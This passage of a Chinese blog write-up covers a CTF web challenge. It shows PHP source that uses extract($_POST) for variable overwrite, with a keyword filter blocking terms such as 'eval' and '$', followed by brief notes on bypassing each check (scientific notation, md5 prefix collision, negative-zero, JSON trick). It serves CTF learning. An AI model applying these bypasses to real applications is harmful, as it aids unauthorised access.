+<h2 id="KEY1">KEY1<a class="post-anchor" href="#KEY1"></a></h2><figure class="highlight php"><table><tbody><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">'Content-type:text/html;charset=utf-8'</span>);<br>highlight_file(<span class="hljs-keyword">__file__</span>);<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>{<br>        <span class="hljs-variable">$filter_word</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>,<span class="hljs-string">'flag'</span>,<span class="hljs-string">'index'</span>,<span class="hljs-string">'KeY1lhv'</span>,<span class="hljs-string">'source'</span>,<span class="hljs-string">'key'</span>,<span class="hljs-string">'eval'</span>,<span class="hljs-string">'echo'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\('</span>,<span class="hljs-string">'\.'</span>,<span class="hljs-string">'num'</span>,<span class="hljs-string">'html'</span>,<span class="hljs-string">'\/'</span>,<span class="hljs-string">'\,'</span>,<span class="hljs-string">'\''</span>,<span class="hljs-string">'0000000'</span>);<br>        <span class="hljs-variable">$filter_phrase</span>= <span class="hljs-string">'/'</span>.implode(<span class="hljs-string">'|'</span>,<span class="hljs-variable">$filter_word</span>).<span class="hljs-string">'/'</span>;<br>        <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter_phrase</span>,<span class="hljs-string">''</span>,<span class="hljs-variable">$string</span>);<br>    }<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ppp</span>){<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$ppp</span>);<br>}<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number1'</span>] = <span class="hljs-string">"1"</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number2'</span>] = <span class="hljs-string">"1"</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">'nunber3'</span>] = <span class="hljs-string">"1"</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number4'</span>] = <span class="hljs-string">'1'</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number5'</span>] = <span class="hljs-string">'1'</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-variable">$num1</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number1'</span>]);        <br><span class="hljs-variable">$num2</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number2'</span>]);        <br><span class="hljs-variable">$num3</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number3'</span>]);        <br><span class="hljs-variable">$num4</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number4'</span>]);<br><span class="hljs-variable">$num5</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">'number5'</span>]);    <br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num1</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$num1</span>)){<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"非数字"</span>);<br>}<br><br><span class="hljs-keyword">else</span>{<br>  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num1</span> &gt; <span class="hljs-number">1024</span>){<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"第一层"</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num2</span>) &amp;&amp; strlen(<span class="hljs-variable">$num2</span>) &lt;= <span class="hljs-number">4</span> &amp;&amp; intval(<span class="hljs-variable">$num2</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">500000</span>){<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"第二层"</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num3</span>) &amp;&amp; <span class="hljs-string">'4bf21cd'</span> === substr(md5(<span class="hljs-variable">$num3</span>),<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)){<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">"第三层"</span>;<br>                <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$num4</span> &lt; <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> == <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> &lt;= <span class="hljs-number">0</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &gt; <span class="hljs-number">6</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &lt; <span class="hljs-number">8</span>)&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num4</span>) ){<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">"第四层"</span>;<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num5</span>)||(strlen(<span class="hljs-variable">$num5</span>)==<span class="hljs-number">0</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>                    <span class="hljs-variable">$b</span>=json_decode(@<span class="hljs-variable">$num5</span>);<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> = <span class="hljs-variable">$b</span> === <span class="hljs-literal">NULL</span>){<br>                                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> === <span class="hljs-literal">true</span>){<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-string">"第五层"</span>;<br>                                    <span class="hljs-keyword">include</span> <span class="hljs-string">'KeY1lhv.php'</span>;<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$KEY1</span>;<br>                                }<br>                        }<span class="hljs-keyword">else</span>{<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>                        }<br>                }<span class="hljs-keyword">else</span>{<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>                }<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>            }<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>        }<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no111"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p>number1 number2使用科学计数法<br>number3 md5前缀碰撞<br>number4 带负号的0值绕过<br>number5 json {1}即为true<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/pI3NRyHxkOwuAqr.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/pI3NRyHxkOwuAqr.png" alt="图片.png"></a><br>成功拿到KEY1</p>
+<h2 id="Key2">Key2<a class="post-anchor" href="#Key2"></a></h2><p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/68BYR95oVbJvhs3.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/68BYR95oVbJvhs3.png" alt="图片.png"></a><br>下载文件<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/IH67GcEmBobntyM.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/IH67GcEmBobntyM.png" alt="图片.png"></a><br>压缩包内有大量docx文件<br>编写脚本提取docx正文文本 寻找带有KEY的文本<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/CFL6Mwn1YuUo9fO.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/CFL6Mwn1YuUo9fO.png" alt="图片.png"></a><br>找到KEY2<br>KEY1 KEY2提交到网站 成功getflag</p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2021/06/08/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9B-CTF-GameContract-WriteUp/">2021年春秋杯网络安全联赛春季赛-CTF-GameContract-WriteUp</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2021/06/14/QWB-2021-WEB-WP/">https://rce.moe/2021/06/14/QWB-2021-WEB-WP/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2021
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
